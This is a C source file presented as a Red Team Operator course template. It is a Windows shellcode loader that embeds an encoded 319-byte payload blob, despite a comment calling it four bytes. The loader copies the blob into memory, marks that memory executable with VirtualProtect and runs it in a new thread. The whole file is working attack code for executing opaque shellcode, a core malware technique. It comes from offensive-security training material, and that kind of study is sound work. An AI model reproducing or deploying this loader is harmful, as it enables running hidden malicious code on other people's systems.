/*

 Red Team Operator course code template
 storing payload in .text section

 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	// 4 byte payload
	unsigned char payload[] = {
		"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
		"\xff\xff\x48\xbb\x36\x92\x7b\x25\x97\x64\x11\x96\x48\x31\x58"
		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xca\xda\xf8\xc1\x67\x8c"
		"\xd1\x96\x36\x92\x3a\x74\xd6\x34\x43\xc7\x60\xda\x4a\xf7\xf2"
		"\x2c\x9a\xc4\x56\xda\xf0\x77\x8f\x2c\x9a\xc4\x16\xda\xf0\x57"
		"\xc7\x2c\x1e\x21\x7c\xd8\x36\x14\x5e\x2c\x20\x56\x9a\xae\x1a"
		"\x59\x95\x48\x31\xd7\xf7\x5b\x76\x64\x96\xa5\xf3\x7b\x64\xd3"
		"\x2a\x6d\x1c\x36\x31\x1d\x74\xae\x33\x24\x47\xef\x91\x1e\x36"
		"\x92\x7b\x6d\x12\xa4\x65\xf1\x7e\x93\xab\x75\x1c\x2c\x09\xd2"
		"\xbd\xd2\x5b\x6c\x96\xb4\xf2\xc0\x7e\x6d\xb2\x64\x1c\x50\x99"
		"\xde\x37\x44\x36\x14\x5e\x2c\x20\x56\x9a\xd3\xba\xec\x9a\x25"
		"\x10\x57\x0e\x72\x0e\xd4\xdb\x67\x5d\xb2\x3e\xd7\x42\xf4\xe2"
		"\xbc\x49\xd2\xbd\xd2\x5f\x6c\x96\xb4\x77\xd7\xbd\x9e\x33\x61"
		"\x1c\x24\x0d\xdf\x37\x42\x3a\xae\x93\xec\x59\x97\xe6\xd3\x23"
		"\x64\xcf\x3a\x48\xcc\x77\xca\x3a\x7c\xd6\x3e\x59\x15\xda\xb2"
		"\x3a\x77\x68\x84\x49\xd7\x6f\xc8\x33\xae\x85\x8d\x46\x69\xc9"
		"\x6d\x26\x6d\x2d\x65\x11\x96\x36\x92\x7b\x25\x97\x2c\x9c\x1b"
		"\x37\x93\x7b\x25\xd6\xde\x20\x1d\x59\x15\x84\xf0\x2c\x94\xa4"
		"\x34\x60\xd3\xc1\x83\x02\xd9\x8c\x69\xe3\xda\xf8\xe1\xbf\x58"
		"\x17\xea\x3c\x12\x80\xc5\xe2\x61\xaa\xd1\x25\xe0\x14\x4f\x97"
		"\x3d\x50\x1f\xec\x6d\xae\x46\xf6\x08\x72\xb8\x53\xea\x1e\x25"
		"\x97\x64\x11\x96"
	};
	unsigned int payload_len = 319;

	// Allocate a memory buffer for payload
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, payload, payload_len);

	// Make new buffer as executable
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// If all good, run the payload
	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}
